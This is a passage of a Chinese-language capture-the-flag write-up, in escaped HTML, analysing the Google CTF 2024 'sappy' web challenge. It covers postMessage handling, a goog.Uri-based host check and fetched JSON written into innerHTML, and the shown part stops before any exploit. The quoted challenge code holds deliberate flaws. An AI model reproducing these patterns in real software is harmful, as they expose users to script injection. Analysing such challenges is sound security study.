\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estringify\u003c/span\u003e({\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003emethod\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;render\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eiframe\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003econtentWindow\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epostMessage\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003emsg\u003c/span\u003e, window.\u003cspan style=\"color:#a6e22e\"\u003eorigin\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到他的按鈕跟顯示是用 iframe，按鈕用 \u003ccode\u003epostMessage\u003c/code\u003e 來控制 iframe，按鈕則是依照 \u003ccode\u003e/pages.json\u003c/code\u003e 來生成，iframe 會去瀏覽 \u003ccode\u003e./sap.html\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;\u003cspan style=\"color:#f92672\"\u003ehtml\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u0026lt;\u003cspan style=\"color:#f92672\"\u003ehead\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;\u003cspan style=\"color:#f92672\"\u003emeta\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echarset\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;utf-8\u0026#34;\u003c/span\u003e /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;\u003cspan style=\"color:#f92672\"\u003estyle\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ebody\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003emargin\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;/\u003cspan style=\"color:#f92672\"\u003estyle\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u0026lt;/\u003cspan style=\"color:#f92672\"\u003ehead\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u0026lt;\u003cspan style=\"color:#f92672\"\u003ebody\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;output\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;./static/sap.js\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;module\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eINTERVAL\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elastHeight\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003esetInterval\u003c/span\u003e(() =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eheight\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eclientHeight\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eheight\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elastHeight\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003elastHeight\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eheight\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eparent\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epostMessage\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estringify\u003c/span\u003e({\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003emethod\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;heightUpdate\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003eheight\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eheight\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          }),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        );\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }, \u003cspan style=\"color:#a6e22e\"\u003eINTERVAL\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;/\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u0026lt;/\u003cspan style=\"color:#f92672\"\u003ebody\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ehtml\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e裡面使用了 \u003ccode\u003e./static/sap.js\u003c/code\u003e 這邊的 js 在架網站時是有過 compile 的，所以 f5 看不到原始碼。\u003c/p\u003e\n\u003cp\u003e來看看他如何載入文字\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eUri\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egoog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003erequire\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;goog.Uri\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egetHost\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eu\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eUri\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eparse\u003c/span\u003e(document.\u003cspan style=\"color:#a6e22e\"\u003elocation\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eu\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003escheme\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;://sappy-web.2024.ctfcompetition.com\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003evalidate\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003evalidate\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eUri\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eparse\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003egetDomain\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehasQuery\u003c/span\u003e()) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid host\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003egetDomain\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sappy-web.2024.ctfcompetition.com\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid host\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebuildUrl\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egetHost\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/sap/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//....................................................\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eswitch\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003emethod\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;initialize\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eAPI\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eAPI\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etypeof\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;string\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebuildUrl\u003c/span\u003e({\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eAPI\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efetch\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eerror\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;something went wrong\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etypeof\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehtml\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;string\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003eoutput\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003einnerHTML\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehtml\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到他會先用 \u003ccode\u003epostMessage\u003c/code\u003e 的 \u003ccode\u003einitialize\u003c/code\u003e 設定好存取 page info 的 base url，接著用 \u003ccode\u003epostMessage\u003c/code\u003e 的 \u003ccode\u003erender\u003c/code\u003e 依照對應的 page id 跟 base url 來用 \u003ccode\u003ebuildUrl\u003c/code\u003e 產生對應的 url，產生前他會對 base url 做一次檢查，如果 domain 不是 \u003ccode\u003esappy-web.2024.ctfcompetition.com\u003c/code\u003e 就會直接 \u003ccode\u003einvalid host\u003c/code\u003e，如果是就直接 \u003ccode\u003e\u0026lt;base url\u0026gt; + \u0026quot;/sap/\u0026quot; + \u0026lt;page id\u0026gt;\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e產生完 url 以後他會去該 url 取得 json，看一下後端 api 的程式 \u003ccode\u003eapp.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003econst pages = require(\u0026#34;./pages.json\u0026#34;);\n//.....................................\napp.get(\u0026#34;/sap/:p\u0026#34;, async (req, res) =\u0026gt; {\n  if (!pages.hasOwnProperty(req.params.p)) {\n    res.status(404).send(\u0026#34;not found\u0026#34;);\n    return res.end();\n  }\n  const p = pages[req.params.p];\n  res.json(p);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e他會去 \u003ccode\u003epage.json\u003c/code\u003e 取得對應 page id 的資料並回傳 json\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 